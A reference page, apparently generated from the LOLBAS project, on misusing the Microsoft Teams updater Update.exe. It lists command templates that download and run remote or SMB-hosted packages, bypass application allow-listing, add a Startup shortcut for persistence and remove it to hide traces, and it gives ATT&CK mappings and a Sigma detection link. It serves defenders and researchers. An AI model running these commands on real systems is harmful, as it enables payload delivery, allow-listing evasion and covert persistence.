---
title: "Update.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Update.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "Update.exe"
functions:
  - "Download"
  - "AWL Bypass"
  - "Execute"
attack_technique_ids:
  - "T1218"
  - "T1547"
  - "T1070"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

## Paths

- `C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe`

## Commands

### 1. Download

The above binary will go to url and look for RELEASES file and download the nuget package.

```cmd
Update.exe --download {REMOTEURL}
```

- Use Case: Download binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 2. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
Update.exe --update={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 3. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
Update.exe --update={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 4. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```cmd
Update.exe --update={PATH_SMB:folder}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 5. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```cmd
Update.exe --update={PATH_SMB:folder}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 6. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
Update.exe --updateRollback={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 7. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```cmd
Update.exe --updateRollback={REMOTEURL}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 8. AWL Bypass

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

```cmd
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

- Use Case: Application Whitelisting Bypass
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 9. AWL Bypass

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```cmd
Update.exe --updateRollback={PATH_SMB:folder}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 10. Execute

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```cmd
Update.exe --updateRollback={PATH_SMB:folder}
```

- Use Case: Download and execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 11. Execute

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

```cmd
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

- Use Case: Execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 12. Execute

Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.

```cmd
Update.exe --createShortcut={PATH:.exe} -l=Startup
```

- Use Case: Execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547: Boot or Logon Autostart Execution]]

### 13. Execute

Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.

```cmd
Update.exe --removeShortcut={PATH:.exe}-l=Startup
```

- Use Case: Execute binary
- Privileges: User
- Operating System: Windows 7 and up with Microsoft Teams installed
- ATT&CK: [[kb/attack/techniques/T1070-indicator_removal|T1070: Indicator Removal]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
- IOC: Update.exe spawned an unknown process

## Resources

- {'Link': 'https://www.youtube.com/watch?v=rOP3hnkj7ls'}
- {'Link': 'https://twitter.com/reegun21/status/1144182772623269889'}
- {'Link': 'https://twitter.com/MrUn1k0d3r/status/1143928885211537408'}
- {'Link': 'https://twitter.com/reegun21/status/1291005287034281990'}
- {'Link': 'http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/'}
- {'Link': 'https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12'}
- {'Link': 'https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56'}
- {'Link': 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/'}

## Acknowledgements

- {'Person': 'Reegun Richard Jayapaul (SpiderLabs, Trustwave)', 'Handle': '@reegun21'}
- {'Person': 'Mr.Un1k0d3r', 'Handle': '@MrUn1k0d3r'}
- {'Person': 'Adam', 'Handle': '@Hexacorn'}
- {'Person': 'Jesus Galvez'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml)
